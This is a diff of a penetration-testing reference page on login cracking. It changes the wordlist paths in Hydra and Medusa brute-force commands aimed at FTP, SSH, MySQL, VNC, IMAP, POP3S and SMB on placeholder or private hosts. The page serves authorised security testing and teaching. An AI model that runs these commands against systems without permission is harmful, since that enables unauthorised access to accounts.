@@ -24,7 +24,7 @@ parent: cracking
 [Hydra](https://github.com/vanhauser-thc/thc-hydra) is a very fast and flexible login cracker that supports many different protocols. It can be used to perform brute-force attacks against various services, including HTTP, FTP, SSH, and more.
 
 ```bash
-hydra -l user -P passlist.txt ftp://192.168.0.1
+hydra -l user -P /tmp/wordlists/passwords/password.txt ftp://192.168.0.1
 ```
 
 You can also use the `-t` flag to define the number of connects in parallel per target which is defaulted to 16, or use the `-m` flag for more options specific to each module.
@@ -39,28 +39,28 @@ hydra -C wordlist.txt TARGET_IP -s PORT http-get /
 - SSH :
 
 ```bash
-hydra -l alice -P password.txt -u -f ssh://TARGET_IP:PORT -t 4
+hydra -l alice -P /tmp/wordlists/passwords/password.txt -u -f ssh://TARGET_IP:PORT -t 4
 ```
 
 - MySQL :
 
 ```bash
-hydra -L user.txt -P password.txt -f mysql://TARGET_IP -V
+hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -P /tmp/wordlists/passwords/password.txt -f mysql://TARGET_IP -V
 ```
 
 - VNC :
 
 ```bash
-hydra -l bob –P password.txt -s PORT TARGET_IP vnc
+hydra -l bob –P /tmp/wordlists/passwords/password.txt -s PORT TARGET_IP vnc
 ```
 
 - Other examples :
 
 ```bash
-  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -p defaultpw imap://192.168.0.1/PLAIN
   hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
   hydra -l admin -p password ftp://[192.168.0.0/24]/
-  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+  hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -P /tmp/wordlists/passwords/password.txt -M targets.txt ssh
 ```
 
 ### Medusa
@@ -89,5 +89,5 @@ medusa -M smbnt -q
 The following command instructs Medusa to test all passwords listed in passwords.txt against a single user (administrator) on the host 192.168.0.20 via the SMB service. The "-e ns" instructs Medusa to additionally check if the administrator account has either a blank password or has its password set to match its username (administrator).
 
 ```bash
-medusa -h 192.168.0.20 -u administrator -P passwords.txt -e ns -M smbnt
+medusa -h 192.168.0.20 -u administrator -P /tmp/wordlists/passwords/password.txt -e ns -M smbnt
 ```
